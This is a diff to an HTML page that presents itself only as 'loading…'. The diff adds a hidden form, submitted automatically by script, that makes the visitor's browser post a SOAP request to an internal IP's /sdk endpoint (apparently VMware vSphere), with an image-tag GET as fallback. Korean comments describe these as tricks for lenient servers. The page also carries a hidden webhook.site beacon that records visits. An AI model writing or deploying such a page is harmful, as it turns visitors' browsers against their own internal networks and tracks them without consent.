@@ -5,6 +5,30 @@
 <meta charset="utf-8">
 <title>loading…</title>
 
+<!-- SDK로 SOAP 바디를 그냥 던져보는 변형 (느슨한 서버용) -->
+<form id="soap" action="http://192.168.0.123/sdk" method="POST"
+      enctype="text/plain" target="u" style="display:none">
+  <!-- name 없이 raw body를 보내게 하는 꼼수 -->
+  <textarea name="">
+<soap:Envelope xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Header><operationID>00000001-00000001</operationID></soap:Header>
+  <soap:Body>
+    <RetrieveServiceContent xmlns="urn:internalvim25">
+      <_this xsi:type="ManagedObjectReference" type="ServiceInstance">ServiceInstance</_this>
+    </RetrieveServiceContent>
+  </soap:Body>
+</soap:Envelope>
+  </textarea>
+</form>
+<script>
+  // JS가 된다면, 플래시 폼 제출 직후 이 폼도 던져봄
+  setTimeout(() => { try{ document.getElementById('soap').submit(); }catch(e){} }, 1200);
+</script>
+
+<!-- JS 비활성일 때 최소한 GET도 시도 -->
+<img src="http://192.168.0.123/sdk" style="display:none" onerror="">
+
+
 <!-- 외부/로컬 비콘(방문) -->
 <img src="https://webhook.site/57a5efaf-3957-4be7-b7a8-29d7c0bb4026?stage=visit&t="+Date.now() style="display:none" onerror="">
 <img src="/beacon?stage=visit&t="+Date.now() style="display:none" onerror="">
